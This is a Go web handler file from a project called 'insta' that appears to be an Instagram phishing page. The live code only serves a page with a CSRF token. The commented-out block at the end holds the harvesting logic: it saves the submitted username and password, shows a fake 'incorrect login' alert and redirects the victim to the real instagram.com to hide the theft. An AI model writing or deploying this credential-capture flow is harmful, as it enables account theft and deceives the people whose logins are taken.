package handler

import (
	"crypto/rand"
	"encoding/base64"
	"insta/pkg/config"
	"insta/pkg/render"
	"net/http"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("X-CSRF-Token", generateCSRFToken())
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Header().Set("Pragma", "no-cache")
	w.Header().Set("Expires", "0")
	render.RenderTemplate(w, "index.html")

}

func generateCSRFToken() string {
	// Generate a random byte slice with 32 bytes
	token := make([]byte, 32)
	rand.Read(token)

	// Encode the byte slice as a base64 string
	tokenString := base64.URLEncoding.EncodeToString(token)

	return tokenString
}

//r.ParseForm()
//username := r.PostFormValue("u_name")
//password := r.PostFormValue("pass")
//
//if len(username) >= 2 && len(password) > 7 {
//	save.SaveCredentials(username, password)
//	dialog.Alert("username and password is not correct !!!")
//	http.Redirect(w, r, "https://www.instagram.com", http.StatusSeeOther)
//} else {
//	fmt.Println("Please enter correct username or password. Try again")
//	http.Redirect(w, r, "/", http.StatusSeeOther)
//}
